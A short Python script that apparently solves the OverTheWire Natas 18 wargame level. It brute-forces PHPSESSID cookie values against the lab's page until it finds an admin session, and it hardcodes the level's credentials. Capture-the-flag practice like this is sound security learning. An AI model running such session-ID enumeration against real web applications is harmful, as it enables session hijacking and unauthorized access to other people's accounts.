import requests
import re

userName = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
regex = "You are an admin"
cookie = "PHPSESSID"

for i in range(640):
    response = requests.get('http://natas18.natas.labs.overthewire.org/index.php', verify=False, auth=(userName, password), cookies={cookie: str(i)})
    regexSearch = re.search(regex, response.text)
    if regexSearch is not None:
        print(response.text)
        break
